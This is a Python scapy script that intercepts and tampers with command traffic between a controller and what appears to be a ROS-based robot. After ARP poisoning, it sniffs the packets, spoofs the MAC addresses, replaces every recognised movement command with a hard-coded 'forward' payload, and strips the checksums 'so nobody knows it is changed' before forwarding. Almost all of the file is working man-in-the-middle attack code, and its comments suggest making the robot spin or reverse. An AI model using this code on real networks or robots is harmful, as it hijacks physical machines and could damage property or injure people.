"""NOTE, before running this module you must ensure system IPv4 forwarding is disabled (Python will handle the packet forwarding).
To check IP forwarding, run command: $ sudo sysctl net.ipv4.ip_forward
The command should output `net.ipv4.ip_forward = 0`
If not, to change and disable ip forwarding, run command: $ sudo sysctl net.ipv4.ip_forward=0
"""
from scapy.all import *

#0~3 flag
#4~11：linear.x
#12~19：linear.y
#20~27：linear.z
#28~35：angular.x
#36~43：angular.y
#44~51：angular.z


IP_A="192.168.1.120"
IP_B="192.168.1.76"
MAC_A='dc:a6:32:f8:f9:b9'
MAC_B='98:54:1b:9e:d2:48'
MAC_M='00:1e:1d:04:04:aa'
NET_INTERFACE='wlx001e1d0404aa'


#This byte data was de-encoded manually, through trial and error
forward_byte_data = bytes(b'0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
left_byte_data = bytes(b'0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
right_byte_data = bytes(b'0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0')
down_byte_data = bytes(b'0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')


#seperating into 2 seperate dicts to increases memory usage, but decrease time taken to search - we always search dict keys. This needs to be done in realtime, there is probably a faster way to get this information than dict keys.
bytes_to_movement_dict = {
  forward_byte_data : "forward",
  left_byte_data : "left",
  right_byte_data : "right",
  down_byte_data : "down"
}
movement_to_bytes_dict = {
  "forward": forward_byte_data,
  "left": left_byte_data,
  "right": right_byte_data,
  "down": down_byte_data
}

def send_pkt(pkt):
  """Callback function for scapy 'sniff' method. Advanced searching, editing, and forwarding of packets."""
  if(pkt.src==MAC_M):
    #this packet is from our own computer, return as we don't want anything to do with this packet.
    return
  else:
    try:
      if(pkt[IP].src==IP_A and pkt[IP].dst==IP_B):
        pkt.src=MAC_M
        pkt.dst=MAC_B
      elif(pkt[IP].src==IP_B and pkt[IP].dst==IP_A):
        #This elif can be changed for the if above. It just depends on how you set IP_A and IP_B. We're trying to intercept packets from the controller to the robot.
        pkt.src=MAC_M #we are the source of this packet, the ARP tables on target computer are looking for packets from our MAC address
        pkt.dst=MAC_A #note change of MAC destintion is the same as IP destination (pkt[IP].dst==IP_A)
        if Raw in pkt: # packet contain raw payload data
          Bytes = bytes(pkt[TCP].payload)
          print(Bytes)
          if(Bytes[0:3] == bytes(b'\x30\x00\x00')): #flag to recognize data. b'\x30\x00\x00' contains message data. b'\x00\30\x00' contains message definition, callerid, message type, and topic.
            print("New command recieved: ")
            print("robot is trying to move: ", bytes_to_movement_dict[Bytes])
            pkt[TCP].load = forward_byte_data # this can be more complex. We could invert the direction, make it spin, etc.
            print("but now it moves forward")
            #no matter what command is sent to the robot, we change that command so that the robot moves forward. In this case, the robot only ever moves forward.
      del(pkt.chksum) #del pkt checksum so nobody knows it is changed
      del(pkt[TCP].chksum)
      sendp(pkt, iface=NET_INTERFACE, realtime=True, verbose=False)
    except Exception as e:
      sendp(pkt, iface=NET_INTERFACE, verbose=False)

def capture_pkt_stream():
  """Captures packets and sends them to the callback function."""
  sniff(filter="host "+IP_A+" and host "+IP_B+" and tcp or udp", iface=NET_INTERFACE, prn=send_pkt)


if __name__ == "__main__":
  capture_pkt_stream()